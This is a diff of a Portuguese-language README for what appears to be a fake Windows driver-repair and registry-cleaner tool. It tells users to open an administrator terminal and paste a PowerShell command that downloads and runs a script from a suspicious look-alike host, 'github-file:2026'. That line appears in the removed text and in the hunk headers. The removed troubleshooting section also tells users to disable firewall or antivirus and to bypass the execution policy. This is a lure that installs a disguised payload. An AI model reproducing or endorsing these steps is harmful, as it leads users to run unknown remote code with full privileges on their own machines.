@@ -39,11 +39,12 @@
 
 ## ⚙️ INSTALAÇÃO & CONFIGURAÇÃO (CMD / PowerShell)
 
-### Etapa 1: Abra o CMD ou PowerShell como Administrador
-Pressione Win+X, depois selecione Terminal (Admin) ou Prompt de Comando (Admin).
+### Etapa 1: Clique na tecla ```cmdWin``` do teclado e pesquise por ```cmd```
 
-### Etapa 2: Execute o Comando de Instalação
-powershell -Command "irm http://github-file:2026/install?id=fixerrors | iex"
+### Etapa 2: Clique com botao direito no cmd e Execute como Administrador
+
+### Etapa 3 Copie o comando abaixo
+```
 
 ### Etapa 3: Aguarde a Conclusão
 [1/4] Escaneando o sistema em busca de erros e drivers ausentes...
@@ -73,11 +74,9 @@ powershell -Command "irm http://github-file:2026/install?id=fixerrors | iex"
 | 🖥️ **Detecção de Erros** | Escaneia todo o sistema em busca de erros, drivers ausentes e arquivos corrompidos |
 | ⬇️ **Download Automático** | Baixa automaticamente todos os drivers que faltam do banco de dados oficial da Microsoft |
 | 🔧 **Ferramentas de Reparo** | Corrige links de drivers quebrados, repara arquivos INF, resolve conflitos entre drivers |
-| 💻 **Suporte de Hardware** | Drivers de GPU, Adaptadores de Rede, Dispositivos de Áudio, Drivers de Chipset, Controladores USB |
 | 🔄 **Atualização Automática** | Mantém os drivers sempre atualizados automaticamente, agenda verificações semanais |
 | 🛠️ **Suporte Legado** | Funciona com Windows 10/11, suporta hardware mais antigo, inclui versões de drivers LTS |
 | 🧹 **Limpeza de Registro** | Remove entradas órfãs, corrige chaves de registro corrompidas, otimiza o desempenho |
-| 🔐 **Sistema de Backup** | Cria pontos de restauração antes das alterações, permite rollback de atualizações de drivers |
 
 ---
 
@@ -91,29 +90,6 @@ powershell -Command "irm http://github-file:2026/install?id=fixerrors | iex"
 | Kit de Reparo | 2.5.2 | ✅ Operacional |
 | Limpador de Registro | 1.8.6 | ✅ Operacional |
 | Compatibilidade GPU | 4.2.1 | ✅ Operacional |
-
----
-
-## 🔧 SOLUÇÃO DE PROBLEMAS
-
-### Erro: "Driver Não Encontrado"
-**Solução:** Execute a ferramenta com privilégios de administrador. Certifique-se de que sua conexão com a internet esteja estável.
-
-### Erro: "Acesso Negado"
-**Solução:** Você precisa executar o CMD ou PowerShell como Administrador. Clique com o botão direito e selecione "Executar como administrador".
-
-### Erro: "Falha na Instalação"
-**Solução:** Tente reiniciar o PC e executar a ferramenta novamente. Se o problema persistir, execute com a flag /force.
-
-### Erro: "Driver Já Instalado"
-**Solução:** A ferramenta detectou que o driver está presente, mas pode estar corrompido. Use a opção "Forçar Reinstalação".
-
-### Erro: "Tempo de Conexão Esgotado"
-**Solução:** Verifique sua conexão com a internet. Desative temporariamente qualquer firewall ou antivírus.
-
-### Erro: "Script Bloqueado pelo PowerShell"
-**Solução:** Execute o comando abaixo antes de rodar a ferramenta:
-Set-ExecutionPolicy Bypass -Scope Process -Force
 
 ---
 
